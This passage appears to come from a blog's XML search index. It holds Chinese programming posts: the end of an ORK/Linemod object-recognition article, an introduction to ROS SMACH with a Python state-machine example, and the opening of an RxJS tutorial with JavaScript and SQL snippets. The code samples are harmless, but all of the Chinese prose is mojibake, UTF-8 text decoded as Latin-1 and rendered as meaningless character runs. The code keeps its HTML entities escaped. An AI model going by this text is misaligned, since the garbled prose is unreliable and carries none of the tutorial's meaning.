ç¸½çµé€™ç¯‡æ–‡ç« å¾ˆç°¡ç•¥åœ°ä»‹ç´¹äº† ORK çš„å®‰è£ã€åŸºæœ¬çš„ä½¿ç”¨æ–¹å¼(ä½¿ç”¨ Linemod )ã€é‚„æœ‰æ¼”ç®—æ³•ç°¡ä»‹ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥è‡ªå·±å‹•æ‰‹ç©ç©çœ‹ (å¦‚æœæ²’æœ‰å¯¦é«”çš„ RGB-D sensorï¼Œä½ ä¹Ÿå¯ä»¥è©¦è‘—ç”¨ Gazebo è£¡é¢çš„ Kinect ä¾†æ¨¡æ“¬)!
å»¶ä¼¸é–±è®€
ä½¿ç”¨ ORK çš„ tabletop æ¼”ç®—æ³•
å»ºç«‹è‡ªå·±çš„ ORK æ¨¡å‹
ORK é–‹ç™¼è€…ä»‹ç´¹æ¼”è¬›
Linemodçš„OpenCVå¯¦ä½œ

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>æ©Ÿå™¨äºº, ç‰©é«”è¾¨è­˜, ROS, Object Recognition Kitchen, Linemod</tag>
      </tags>
  </entry>
  <entry>
    <title>ROS SMACH ç°¡ä»‹</title>
    <url>/2017/02/18/ros-smach-intro/</url>
    <content><![CDATA[å‰è¨€é€™æ¬¡æƒ³è·Ÿå¤§å®¶ä»‹ç´¹ä¸€å€‹å¥½ç”¨çš„å·¥å…· - SMACH (å”¸æ³•åŒ smash)ã€‚SMACH çš„å­˜åœ¨æ„ç¾©æ˜¯ç‚ºäº†è®“å¤§å®¶å¯ä»¥ç”¨ç³»çµ±åŒ–çš„æ–¹å¼ä¾†æ’°å¯«æ©Ÿå™¨äººçš„è¡Œç‚ºã€‚é€™å€‹ç³»çµ±åŒ–çš„æ–¹å¼æ˜¯ Finite State Machineï¼Œæ¦‚å¿µä¸Šè·Ÿä¹‹å‰ä»‹ç´¹éçš„ ecto çš„ graph æ¦‚å¿µæœ‰é»ç›¸ä¼¼ã€‚
ç°¡å–®ä¾†èªªï¼Œå°±æ˜¯è®“æˆ‘å€‘å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å®šç¾©æ©Ÿå™¨äººçš„å„ç¨®ç‹€æ…‹ï¼Œæ‰€ä»¥æ©Ÿå™¨äººå°±ä¸å†åªæ˜¯æ ¹æ“šç¨‹å¼ç¢¼è£¡é¢å¯«å®šçš„ä¸€é€£ä¸²è¡Œç‚ºå»è¡Œå‹•ï¼Œè€Œå¯ä»¥æ ¹æ“šå„ç¨®ä¸åŒçš„æ¢ä»¶é€²è¡Œç‹€æ…‹çš„åˆ‡æ›ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œä¸€å€‹æƒåœ°æ©Ÿå™¨äººå¹³æ™‚è™•æ–¼æƒåœ°ç‹€æ…‹æ™‚ï¼Œä»–è¦åšçš„äº‹æƒ…å°±æ˜¯ç§»å‹•è·Ÿå¸å¡µï¼Œè€Œç•¶æ©Ÿå™¨äººçœ‹åˆ°éšœç¤™ç‰©çš„æ™‚å€™ï¼Œå°±å¯ä»¥åˆ‡æ›åˆ°é¿é–‹éšœç¤™ç‰©çš„ç‹€æ…‹ï¼Œç­‰åˆ°éšœç¤™ç‰©æ¶ˆå¤±çš„æ™‚å€™ï¼Œå†åˆ‡æ›åˆ°æƒåœ°ç‹€æ…‹ã€‚
æƒ³è¦å° SMACH æœ‰æ›´å…·é«”çš„æ¦‚å¿µå—? å¯ä»¥çœ‹çœ‹é€™å€‹å½±ç‰‡:

é›–ç„¶ SMACH è·Ÿ ROS å¯ä»¥ä¸€ä½µä½¿ç”¨ï¼Œä»–çš„æ ¸å¿ƒå…¶å¯¦æ˜¯ä¸€å€‹è·Ÿ ROS æ²’æœ‰é—œä¿‚çš„ Python libraryï¼Œæ˜¯é€é smach_ros ä¾†è·Ÿ ROS çš„ topics, services è·Ÿ actions ä¸²æ¥ã€‚
ä½¿ç”¨ SMACH çš„å¹¾å¤§å¥½è™•æˆ‘å€‘é›–ç„¶çŸ¥é“ Finite State Machine å¯ä»¥å»ºç«‹ç”±ç‹€æ…‹ä¾†æ±ºå®šè¡Œç‚ºçš„ç¨‹å¼ï¼Œä½†é™¤äº†é€™å€‹ä¹‹å¤–é‚„æœ‰å¹¾å€‹ç‰¹é»ï¼Œè®“æˆ‘å€‘å¯ä»¥åœ¨é©ç•¶çš„æ™‚å€™ä½¿ç”¨ SMACHã€‚

Task Hierarchy: state å¯ä»¥ç”±æ›´å¤šå° state çµ„æˆï¼Œå»ºç«‹è¤‡é›œçš„è¡Œç‚º
Task Priority: state ä¹‹é–“å¯ä»¥æœ‰å„ªå…ˆæ¬Šï¼Œæœ‰é«˜å„ªå…ˆæ¬Šçš„ state å¯ä»¥ä¸­æ–·ä½å„ªå…ˆæ¬Šçš„ state 
Concurrency: å¦‚æœæƒ³è¦åŒæ™‚åŸ·è¡Œå¤šé …è¡Œç‚ºï¼Œä¹Ÿå¯ä»¥ç”¨ SMACH ä¾†å¯¦ç¾

SMACH åŸºæœ¬å°ç¨‹å¼é€™é‚Šæˆ‘å€‘ç”¨å€‹ç°¡å–®çš„ç¯„ä¾‹ä¾†ä»‹ç´¹è¦æ€éº¼å‰µé€ ä¸€å€‹ state machineï¼Œé¦–å…ˆå‘¢ï¼Œæœ€é‡è¦çš„æ±è¥¿å°±æ˜¯ stateï¼Œåœ¨ SMACH çš„èªæ³•è¦å®šä¸­ï¼Œæ¯å€‹ state ç”¨ä¸€å€‹ class ä¾†å¯«ï¼Œå…¶ä¸­è¦åŒ…å« init å’Œ execute å…©å€‹å‡½å¼ï¼Œå¯¦éš›åŸ·è¡Œçš„è¡Œç‚ºæœƒè¢«å¯«åœ¨ execute å‡½å¼è£¡é¢ã€‚
ç•¶æ¯å€‹ state çš„è¡Œç‚ºéƒ½è¢«å®šç¾©å¥½ä¹‹å¾Œï¼Œå‰©ä¸‹è¦å¯«çš„å°±åªéœ€è¦åœ¨ main ä¸­ï¼Œå°‡å„å€‹ state åŠ å…¥ SMACH çš„ container (å…¶å¯¦ state machine å°±åªæ˜¯ä¸€å€‹åŒ…å«å¾ˆå¤š state çš„ container è€Œå·²) å°±å¥½ã€‚
åœ¨ä¸‹é¢çš„ç¯„ä¾‹ä¸­ï¼Œåªæœ‰å…©å€‹ç°¡å–®çš„ state - FOO å’Œ BARï¼Œä»–å€‘çš„é—œä¿‚å¦‚ä¸‹åœ–:

#!/usr/bin/env pythonimport roslib; roslib.load_manifest(&#x27;smach_tutorials&#x27;)import rospyimport smachimport smach_ros# define state Fooclass Foo(smach.State):    def __init__(self):        smach.State.__init__(self, outcomes=[&#x27;outcome1&#x27;,&#x27;outcome2&#x27;])        self.counter = 0    def execute(self, userdata):        rospy.loginfo(&#x27;Executing state FOO&#x27;)        if self.counter &lt; 3:            self.counter += 1            return &#x27;outcome1&#x27;        else:            return &#x27;outcome2&#x27;# define state Barclass Bar(smach.State):    def __init__(self):        smach.State.__init__(self, outcomes=[&#x27;outcome1&#x27;])    def execute(self, userdata):        rospy.loginfo(&#x27;Executing state BAR&#x27;)        return &#x27;outcome1&#x27;        def main():    rospy.init_node(&#x27;smach_example_state_machine&#x27;)    # Create a SMACH state machine    sm = smach.StateMachine(outcomes=[&#x27;outcome4&#x27;])    # Open the container    with sm:        # Add states to the container        smach.StateMachine.add(&#x27;FOO&#x27;, Foo(),                                transitions=&#123;&#x27;outcome1&#x27;:&#x27;BAR&#x27;, &#x27;outcome2&#x27;:&#x27;outcome4&#x27;&#125;)        smach.StateMachine.add(&#x27;BAR&#x27;, Bar(),                                transitions=&#123;&#x27;outcome1&#x27;:&#x27;FOO&#x27;&#125;)    # Execute SMACH plan    outcome = sm.execute()if __name__ == &#x27;__main__&#x27;:    main()

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ç°¡ä»‹äº† SMACH é€™å€‹ packageï¼Œä¹Ÿä»‹ç´¹äº†è¦æ€éº¼å¯«ä¸€å€‹éå¸¸å°çš„ state machineï¼ŒSMACH å¯ä»¥åšåˆ°ç›¸ç•¶è¤‡é›œçš„è¡Œç‚ºï¼Œå¦‚æœæœ‰èˆˆè¶£çš„è©±ï¼Œå¯ä»¥å»çœ‹çœ‹å»¶ä¼¸é–±è®€ä¸­æä¾›çš„æ•™å­¸ï¼Œè£¡é¢æœ‰ç›¸ç•¶å®Œæ•´è©³ç´°çš„èªªæ˜ã€‚
å…¶å¯¦è¦æ’°å¯«æ¯”è¼ƒè¤‡é›œçš„æ©Ÿå™¨äººè¡Œç‚ºï¼Œé™¤äº† finite state machine ä¹‹å¤–ï¼Œbehavior tree è·Ÿ teer éƒ½æ˜¯å¸¸è¦‹çš„é¸æ“‡ï¼Œæ ¹æ“šæ‡‰ç”¨çš„ä¸åŒå¯ä»¥é¸æ“‡è‡ªå·±æƒ³è¦çš„æ–¹æ³•ã€‚é€£çµå¯ä»¥åœ¨å»¶ä¼¸é–±è®€çš„åœ°æ–¹æ‰¾åˆ°å–”ï¼
å»¶ä¼¸é–±è®€
SMACH Tutorials
ROS behavior tree package
ROS teer package

]]></content>
      <tags>
        <tag>æ©Ÿå™¨äºº, Robot, ROS, SMACH, Finite State Machine</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸Œæœ›æ˜¯æœ€æ·ºé¡¯æ˜“æ‡‚çš„ RxJS æ•™å­¸</title>
    <url>/2017/12/08/rxjs/</url>
    <content><![CDATA[å‰è¨€é—œæ³¨ RxJS å·²ç¶“å¥½ä¸€æ®µæ™‚é–“äº†ï¼Œæœ€æ—©çŸ¥é“é€™å€‹æ±è¥¿æ˜¯å› ç‚º redux-observableï¼Œæ˜¯ä¸€å€‹ redux çš„ middlewareï¼ŒNetflix åˆ©ç”¨å®ƒä¾†è§£æ±ºè¤‡é›œçš„éåŒæ­¥ç›¸é—œå•é¡Œï¼Œé‚£æ™‚å€™æˆ‘é€£redux-sagaéƒ½é‚„æ²’ææ‡‚ï¼Œæ²’æƒ³åˆ°å°±åˆæœ‰æ–°çš„æ±è¥¿å‡ºä¾†äº†ã€‚
åŠå¹´å‰èŠ±äº†ä¸€äº›æ™‚é–“ï¼Œæ‰¾äº†å¾ˆå¤šç¶²è·¯ä¸Šçš„è³‡æ–™ï¼Œè©¦åœ–æƒ³è¦ææ‡‚é€™æ•´å€‹æ±è¥¿ã€‚å¯æ˜¯å°æˆ‘ä¾†èªªï¼Œå¾ˆå¤šæ•™å­¸çš„æ­¥èª¿éƒ½å¤ªå¿«äº†ï¼Œä¸ç„¶å°±æ˜¯è¬›å¾—å¤ªä»”ç´°ï¼Œåè€Œè®“åˆå­¸è€…ç„¡æ‰€é©å¾ã€‚
é€™æ¬¡æœ‰æ©Ÿæœƒåœ¨å…¬å¸çš„æ–°å°ˆæ¡ˆè£¡é¢å˜—è©¦å°å…¥redux-observableï¼Œèº«ç‚ºæå€¡è¦å°å…¥çš„äººï¼Œå‹¢å¿…è¦å°é€™æ±è¥¿æœ‰ä¸€å®šçš„ç­è§£ã€‚ç§‰æŒè‘—é€™å€‹æƒ³æ³•ï¼Œä¸Šé€±èªçœŸèŠ±äº†é»æ™‚é–“å†æ¬¡æŠŠç›¸é—œè³‡æºéƒ½ç ”ç©¶äº†ä¸€ä¸‹ï¼Œæ¼¸æ¼¸æ•´ç†å‡ºä¸€å¥—ã€Œæˆ‘è¦ºå¾—æ‡‰è©²å¯ä»¥æŠŠ RxJS è¬›å¾—æ›´å¥½æ‡‚ã€çš„æ–¹æ³•ï¼Œåœ¨é€™é‚Šè·Ÿå¤§å®¶åˆ†äº«ä¸€ä¸‹ã€‚
åœ¨é–‹å§‹ä¹‹å‰ï¼Œè¦å…ˆå¤§åŠ›ç¨±è®šå»å¹´ iT é‚¦å¹«å¿™éµäººè³½çš„ Web çµ„å† è»ï¼š30 å¤©ç²¾é€š RxJSï¼Œé€™ç³»åˆ—æ–‡ç« å¯«å¾—å¾ˆå®Œæ•´ï¼Œæ„Ÿå—å¾—å‡ºä¾†ä½œè€…ä¸‹äº†å¾ˆå¤šåŠŸå¤«åœ¨é€™ä¸Šé¢ã€‚çœ‹å®Œé€™ç¯‡ä¹‹å¾Œå¦‚æœå°æ›´å¤šæ‡‰ç”¨æœ‰èˆˆè¶£çš„ï¼Œå¯ä»¥å»æŠŠé€™ç³»åˆ—çš„æ–‡ç« è®€å®Œã€‚
å¥½ï¼Œé‚£å°±è®“æˆ‘å€‘é–‹å§‹å§ï¼
è«‹ä½ å…ˆå¿˜æ‰ RxJSæ²’éŒ¯ï¼Œä½ æ²’çœ‹éŒ¯ã€‚
è¦å­¸æœƒ RxJS çš„ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯ï¼šå¿˜è¨˜å®ƒã€‚
å¿˜è¨˜æœ‰é€™å€‹æ±è¥¿ï¼Œå®Œå…¨å¿˜è¨˜ï¼Œå…ˆè®“æˆ‘è¬›å¹¾å€‹å…¶ä»–æ±è¥¿ï¼Œç­‰æˆ‘å€‘éœ€è¦è¬›åˆ° RxJS çš„æ™‚å€™æˆ‘æœƒå†æé†’ä½ çš„ã€‚
åœ¨æˆ‘å€‘è«‡åˆ°ä¸»è§’ä¹‹å‰ï¼Œå…ˆä¾†åšä¸€äº›æœ‰è¶£çš„äº‹æƒ…å§ï¼
ç¨‹å¼åŸºç¤èƒ½åŠ›æ¸¬è©¦å…ˆè®“æˆ‘å€‘åšä¸€å€‹ç°¡å–®çš„ç·´ç¿’é¡Œæš–èº«ï¼Œé¡Œç›®æ˜¯é€™æ¨£çš„ï¼š

æœ‰ä¸€å€‹é™£åˆ—ï¼Œè£¡é¢æœ‰ä¸‰ç¨®é¡å‹çš„è³‡æ–™ï¼šæ•¸å­—ã€a~zçµ„æˆçš„å­—ä¸²ã€æ•¸å­—çµ„æˆçš„å­—ä¸²ï¼Œè«‹ä½ æŠŠæ¯å€‹æ•¸å­—ä»¥åŠæ•¸å­—çµ„æˆçš„å­—ä¸²ä¹˜ä»¥äºŒä¹‹å¾ŒåŠ ç¸½ç¯„ä¾‹è¼¸å…¥ï¼š[1, 5, 9, 3, â€˜hiâ€™, â€˜tbâ€™, 456, â€˜11â€™, â€˜yoyoyoâ€™]

ä½ çœ‹å®Œä¹‹å¾Œæ‡‰è©²æœƒèªªï¼šã€Œé€™æœ‰ä»€éº¼é›£çš„ï¼Ÿã€ï¼Œä¸¦ä¸”åœ¨ä¸€åˆ†é˜ä»¥å…§å°±å¯«å‡ºä¸‹é¢çš„ç¨‹å¼ç¢¼ï¼š
const source = [1, 5, 9, 3, &#x27;hi&#x27;, &#x27;tb&#x27;, 456, &#x27;11&#x27;, &#x27;yoyoyo&#x27;];let total = 0;  for (let i = 0; i &lt; source.length; i++) &#123;  let num = parseInt(source[i], 10);  if (!isNaN(num)) &#123;    total += num * 2;  &#125;&#125;

ç›¸ä¿¡å¤§å®¶ä¸€å®šéƒ½æ˜¯å¾ˆç›´è¦ºçš„å°±å¯«å‡ºä¸Šé¢çš„ç¨‹å¼ç¢¼ï¼Œä½†å¦‚æœä½ æ˜¯å€‹ functional programming çš„æ„›å¥½è€…ï¼Œä½ å¯èƒ½æœƒæ”¹ç”¨å¦å¤–ä¸€ç¨®æ€è·¯ä¾†è§£æ±ºå•é¡Œï¼š
const source = [1, 5, 9, 3, &#x27;hi&#x27;, &#x27;tb&#x27;, 456, &#x27;11&#x27;, &#x27;yoyoyo&#x27;];  let total = source  .map(x =&gt; parseInt(x, 10))  .filter(x =&gt; !isNaN(x))  .map(x =&gt; x * 2)  .reduce((total, value) =&gt; total + value )

ä¸€é–‹å§‹çš„ä¾‹å­å«åšImperativeï¼ˆå‘½ä»¤å¼ï¼‰ï¼Œç”¨é™£åˆ—æ­é…ä¸€å †å‡½å¼çš„ä¾‹å­å«åšDeclarativeï¼ˆè²æ˜å¼ï¼‰ã€‚å¦‚æœä½ å»æŸ¥äº†ä¸€ä¸‹å®šç¾©ï¼Œæ‡‰è©²æœƒçœ‹åˆ°é€™å…©å€‹çš„è§£é‡‹ï¼š

Imperative æ˜¯å‘½ä»¤æ©Ÿå™¨å»åšäº‹æƒ…ï¼ˆhowï¼‰ï¼Œé€™æ¨£ä¸ç®¡ä½ æƒ³è¦çš„æ˜¯ä»€éº¼ï¼ˆwhatï¼‰ï¼Œéƒ½æœƒæŒ‰ç…§ä½ çš„å‘½ä»¤å¯¦ç¾ï¼›Declarative æ˜¯å‘Šè¨´æ©Ÿå™¨ä½ æƒ³è¦çš„æ˜¯ä»€éº¼ï¼ˆwhatï¼‰ï¼Œè®“æ©Ÿå™¨æƒ³å‡ºå¦‚ä½•å»åšï¼ˆhowï¼‰

å¥½ï¼Œä½ æœ‰çœ‹æ‡‚ä¸Šé¢é€™äº›åœ¨èªªä»€éº¼å—ï¼Ÿ
æˆ‘æ˜¯æ²’æœ‰å•¦ã€‚
æ‰€ä»¥è®“æˆ‘å€‘å†çœ‹ä¸€å€‹ä¾‹å­ï¼Œå…¶å¯¦ Declarative ä½ å·²ç¶“å¸¸å¸¸åœ¨ç”¨äº†ï¼Œåªæ˜¯ä½ ä¸çŸ¥é“è€Œå·²ï¼Œé‚£å°±æ˜¯ SQLï¼š
SELECT * from dogs INNER JOIN owners WHERE dogs.owner_id = owners.id

é€™å¥è©±å°±æ˜¯ï¼šæˆ‘è¦æ‰€æœ‰ç‹—çš„è³‡æ–™åŠ ä¸Šä¸»äººçš„è³‡æ–™ã€‚
æˆ‘åªæœ‰èªªã€Œæˆ‘è¦ã€è€Œå·²ï¼Œé‚£è¦æ€éº¼æ‹¿åˆ°é€™äº›è³‡æ–™ï¼Ÿæˆ‘ä¸çŸ¥é“ï¼Œæˆ‘ä¹Ÿä¸ç”¨çŸ¥é“ï¼Œéƒ½è®“ SQL åº•å±¤æ±ºå®šæ€éº¼å»æ“ä½œå°±å¥½ã€‚
å¦‚æœæˆ‘è¦è‡ªå·±åšå‡ºé€™äº›è³‡æ–™ï¼Œåœ¨ JavaScript è£¡é¢æˆ‘å¿…é ˆé€™æ¨£å¯«ï¼ˆç¨‹å¼ç¢¼å–è‡ªå£°æ˜å¼ç¼–ç¨‹å’Œå‘½ä»¤å¼ç¼–ç¨‹çš„æ¯”è¾ƒï¼‰ï¼š
//dogs = [&#123;name: &#x27;Fido&#x27;, owner_id: 1&#125;, &#123;...&#125;, ... ]//owners = [&#123;id: 1, name: &#x27;Bob&#x27;&#125;, &#123;...&#125;, ...]  var dogsWithOwners = []var dog, owner  for(var di=0; di &lt; dogs.length; di++) &#123;  dog = dogs[di]  for(var oi=0; oi &lt; owners.length; oi++) &#123;    owner = owners[oi]    if (owner &amp;&amp; dog.owner_id == owner.id) &#123;      dogsWithOwners.push(&#123;        dog: dog,        owner: owner      &#125;)    &#125;  &#125;&#125;

æ‡‰è©²å¯ä»¥å¤§è‡´é«”é©—å‡ºå…©è€…çš„å·®åˆ¥å§ï¼Ÿå¾Œè€…ä½ å¿…é ˆè‡ªå·±ä¸€æ­¥æ­¥å»æ±ºå®šè©²æ€éº¼åšï¼Œè€Œå‰è€…åªæ˜¯åƒ…åƒ…è·Ÿä½ èªªï¼šã€Œæˆ‘æƒ³è¦æ€æ¨£çš„è³‡æ–™ã€è€Œå·²ã€‚
æ¥è‘—æˆ‘å€‘å†æŠŠç›®å…‰æ”¾å›åˆ°æŠŠæ•¸å­—ä¹˜ä»¥äºŒç›¸åŠ çš„é‚£å€‹ç·´ç¿’ã€‚å°æˆ‘ä¾†èªªï¼Œæœ€å¤§çš„ä¸åŒé»æ˜¯å¾Œé¢é‚£å€‹ç”¨é™£åˆ—æ­é…å‡½å¼çš„ä¾‹å­ï¼Œä»–çš„æ ¸å¿ƒæ¦‚å¿µæ˜¯ï¼š

æŠŠåŸå§‹è³‡æ–™ç¶“éä¸€é€£ä¸²çš„è½‰æ›ï¼Œè®Šæˆä½ æƒ³è¦çš„è³‡è¨Š

é€™é»è¶…ç´šé‡è¦ï¼Œå› ç‚ºåœ¨ä¸€é–‹å§‹çš„ä¾‹å­ä¸­ï¼Œæˆ‘å€‘æ˜¯è‡ªå·±ä¸€æ­¥æ­¥å» parseï¼Œå»æª¢æŸ¥å»ç›¸åŠ ï¼Œå¾—å‡ºæ•¸å­—çš„ç¸½å’Œã€‚è€Œå¾Œé¢çš„é‚£å€‹ä¾‹å­ï¼Œä»–æ˜¯æŠŠåŸå§‹çš„è³‡æ–™ï¼ˆé™£åˆ—ï¼‰ï¼Œç¶“éä¸€ç³»åˆ—çš„è½‰æ›ï¼ˆmap, filter, reduceï¼‰ï¼Œæœ€å¾Œè®Šæˆäº†æˆ‘å€‘æƒ³è¦çš„ç­”æ¡ˆã€‚
ç•«æˆåœ–çš„è©±ï¼Œæ‡‰è©²æœƒé•·é€™æ¨£ï¼ˆè«‹åŸè«’æˆ‘å·æ‡¶æŠŠä¹˜äºŒçš„éƒ¨åˆ†æ‹¿æ‰äº†ï¼Œä½†æ„æ€ä¸å½±éŸ¿ï¼‰ï¼š

æŠŠåŸå§‹è³‡æ–™ç¶“éä¸€é€£ä¸²çš„è½‰æ›ï¼Œæœ€å¾Œè®Šæˆä½ æƒ³è¦çš„ç­”æ¡ˆï¼Œé€™é»å°±æ˜¯å¾Œè€…æœ€å¤§çš„ä¸åŒã€‚åªè¦ä½ æœ‰äº†é€™å€‹åŸºç¤çŸ¥è­˜ä¹‹å¾Œï¼Œå†ä¾†çœ‹ RxJS å°±ä¸æœƒè¦ºå¾—å¤ªå¥‡æ€ªäº†ã€‚
Reactive Programmingè«‡åˆ° RxJS çš„æ™‚å€™ï¼Œéƒ½æœƒè«‡åˆ° Reactive é€™å€‹è©ï¼Œé‚£ä»€éº¼æ˜¯ Reactive å‘¢ï¼Ÿå¯ä»¥å¾è‹±æ–‡ä¸Šçš„å­—ç¾©ä¾†çœ‹ï¼Œé€™å€‹å–®å­—çš„æ„æ€æ˜¯ï¼šã€Œåæ‡‰ã€åæ‡‰æ€§çš„ã€ï¼Œæ„æ€å°±æ˜¯ä½ è¦å°ä¸€äº›äº‹æƒ…åšå‡ºåæ‡‰ã€‚
æ‰€ä»¥ Reactive å…¶å¯¦å°±æ˜¯åœ¨è¬›èªªï¼šã€ŒæŸäº›äº‹æƒ…ç™¼ç”Ÿæ™‚ï¼Œæˆ‘èƒ½å¤ åšå‡ºåæ‡‰ã€ã€‚
è®“æˆ‘å€‘ä¾†èˆ‰ä¸€å€‹å¤§å®¶éå¸¸ç†ŸçŸ¥çš„ä¾‹å­ï¼š  
window.addEventListener(&#x27;click&#x27;, function()&#123;  console.log(&#x27;click!&#x27;);&#125;)

æˆ‘å€‘åŠ äº†ä¸€å€‹ event listener åœ¨ window ä¸Šé¢ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥ç›£è½åˆ°é€™å€‹äº‹ä»¶ï¼Œæ¯ç•¶ä½¿ç”¨è€…é»æ“Šçš„æ™‚å€™å°±åˆ—å°å‡º logã€‚æ›å¥è©±èªªï¼Œé€™æ¨£å°±æ˜¯ï¼šã€Œç•¶ window è¢«é»æ“Šæ™‚ï¼Œæˆ‘å¯ä»¥åšå‡ºåæ‡‰ã€ã€‚
æ­£å¼é€²å…¥ RxJSå¦‚æœä½ å»çœ‹ ReactiveX çš„ç¶²é ï¼Œä½ æœƒç™¼ç¾ä»–æœ‰æ˜ç¢ºçš„å®šç¾© ReactiveXï¼š

ReactiveX is a combination of the best ideas fromthe Observer pattern, the Iterator pattern, and functional programming

ç¬¬ä¸€å€‹ Observer pattern å°±åƒæ˜¯ event listener é‚£æ¨£ï¼Œåœ¨æŸäº›äº‹æƒ…ç™¼ç”Ÿæ™‚ï¼Œæˆ‘å€‘å¯ä»¥å°å…¶ä½œå‡ºåæ‡‰ï¼›ç¬¬äºŒå€‹ Iterator pattern æˆ‘å€‘è·³éä¸è¬›ï¼Œæˆ‘èªç‚ºæš«æ™‚ä¸å½±éŸ¿ç†è§£ï¼›ç¬¬ä¸‰å€‹å°±åƒæ˜¯ä¸€é–‹å§‹çš„ä¾‹å­ï¼Œæˆ‘å€‘å¯ä»¥æŠŠä¸€å€‹é™£åˆ—ç¶“éå¤šæ¬¡è½‰æ›ï¼Œè½‰æ›æˆæˆ‘å€‘æƒ³è¦çš„è³‡æ–™ã€‚
åœ¨ Reactive Programming è£¡é¢ï¼Œæœ€é‡è¦çš„å…©å€‹æ±è¥¿å«åš Observable è·Ÿ Observerï¼Œå…¶å¯¦ä¸€é–‹å§‹è®“æˆ‘æœ€å›°æƒ‘çš„é»æ˜¯å› ç‚ºæˆ‘è‹±æ–‡ä¸å¥½ï¼Œä¸çŸ¥é“é€™å…©å€‹åˆ°åº•èª°æ˜¯è§€å¯Ÿçš„èª°æ˜¯è¢«è§€å¯Ÿçš„ã€‚
å…ˆæŠŠå®ƒå€‘ç¿»æˆä¸­æ–‡ï¼ŒObservable å°±æ˜¯ã€Œå¯è¢«è§€å¯Ÿçš„ã€ï¼ŒObserver å°±æ˜¯æ‰€è¬‚çš„ã€Œè§€å¯Ÿè€…ã€ã€‚
é€™æ˜¯ä»€éº¼æ„æ€å‘¢ï¼Ÿå°±å¦‚åŒä¸Šé¢çš„ä¾‹å­ä¸€æ¨£ï¼Œç•¶ï¼ˆå¯è¢«è§€å¯Ÿçš„æ±è¥¿ï¼‰æœ‰äº‹æƒ…ç™¼ç”Ÿï¼Œï¼ˆObserverï¼Œè§€å¯Ÿè€…ï¼‰å°±å¯ä»¥åšå‡ºåæ‡‰ã€‚
ç›´æ¥èˆ‰ä¸€å€‹ä¾‹å­ä½ å°±çŸ¥é“äº†ï¼š
Rx.Observable.fromEvent(window, &#x27;click&#x27;)  .subscribe(e =&gt; &#123;    console.log(&#x27;click~&#x27;);  &#125;)

ä¸Šé¢é€™æ®µç¨‹å¼ç¢¼è·Ÿæˆ‘å¹« window åŠ ä¸Š event listener åœ¨åšçš„äº‹æƒ…å®Œå…¨ä¸€æ¨£ï¼Œåªæ˜¯é€™é‚Šæˆ‘å€‘ä½¿ç”¨äº† RxJS æä¾›çš„æ–¹æ³•å«åšfromEventï¼Œä¾†æŠŠä¸€å€‹ event è½‰æˆ Observableï¼ˆå¯è¢«è§€å¯Ÿçš„ï¼‰ï¼Œä¸¦ä¸”åœ¨æœ€å¾ŒåŠ ä¸Š subscribeã€‚
é€™æ¨£å¯«å°±ä»£è¡¨èªªæˆ‘è¨‚é–±äº†é€™å€‹ Observableï¼Œåªè¦æœ‰ä»»ä½•äº‹æƒ…ç™¼ç”Ÿï¼Œå°±æœƒåŸ·è¡Œæˆ‘å‚³é€²å»çš„ functionã€‚
æ‰€ä»¥åˆ°åº•ä»€éº¼æ˜¯ Observableï¼Ÿ
Observable å°±æ˜¯ä¸€å€‹å¯è¢«è§€å¯Ÿçš„å°è±¡ï¼Œé€™å€‹å°è±¡å¯ä»¥æ˜¯ä»»ä½•æ±è¥¿ï¼ˆä¾‹å¦‚èªªä¸Šè¿°ä¾‹å­å°±æ˜¯ window çš„ click äº‹ä»¶ï¼‰ï¼Œç•¶æœ‰æ–°è³‡æ–™çš„æ™‚å€™ï¼ˆä¾‹å¦‚èªªæ–°çš„é»æ“Šäº‹ä»¶ï¼‰ï¼Œä½ å°±å¯ä»¥æ¥æ”¶åˆ°é€™å€‹æ–°è³‡æ–™çš„è³‡è¨Šä¸¦ä¸”åšå‡ºåæ‡‰ã€‚
æ¯”èµ· Observable é€™å€‹å†·å†°å†°çš„èªªæ³•ï¼Œæˆ‘æ›´å–œæ­¡çš„ä¸€å€‹èªªæ³•æ˜¯ streamï¼Œè³‡æ–™æµã€‚å…¶å¯¦æ¯ä¸€å€‹ Observable å°±æ˜¯ä¸€å€‹è³‡æ–™æµï¼Œä½†ä»€éº¼æ˜¯è³‡æ–™æµï¼Ÿä½ å°±æƒ³åƒæˆæ˜¯æœƒä¸€ç›´å¢åŠ å…ƒç´ çš„é™£åˆ—å°±å¥½äº†ï¼Œæœ‰æ–°çš„äº‹ä»¶ç™¼ç”Ÿå°± push é€²å»ã€‚å¦‚æœä½ å–œæ­¡æ›´å°ˆæ¥­ä¸€é»çš„èªªæ³•ï¼Œå¯ä»¥å«å®ƒï¼šã€Œæ™‚é–“åºåˆ—ä¸Šçš„ä¸€é€£ä¸²è³‡æ–™äº‹ä»¶ã€ï¼ˆå–è‡ª Reactive Programming ç°¡ä»‹èˆ‡æ•™å­¸(ä»¥ RxJS ç‚ºä¾‹)ï¼‰
æˆ–æ˜¯æˆ‘å†èˆ‰ä¸€å€‹ä¾‹å­ï¼Œstream çš„å¦å¤–ä¸€å€‹è§£é‡‹å°±æ˜¯æ‰€è¬‚çš„ã€Œä¸²æµå½±ç‰‡ã€ï¼Œæ„æ€å°±æ˜¯éš¨è‘—ä½ ä¸æ–·æ’­æ”¾ï¼Œå°±æœƒä¸æ–·ä¸‹è¼‰æ–°çš„ç‰‡æ®µé€²ä¾†ã€‚æ­¤æ™‚ä½ è…¦ä¸­æ‡‰è©²è¦æœ‰å€‹ç•«é¢ï¼Œå°±æ˜¯åƒæ°´æµé‚£æ¨£ï¼Œä¸æ–·æœ‰æ–°çš„æ±è¥¿æµé€²ä¾†ï¼Œé€™å€‹æ±è¥¿å°±å«åš streamã€‚
ï¼ˆåœ–ç‰‡å–è‡ª giphyï¼‰
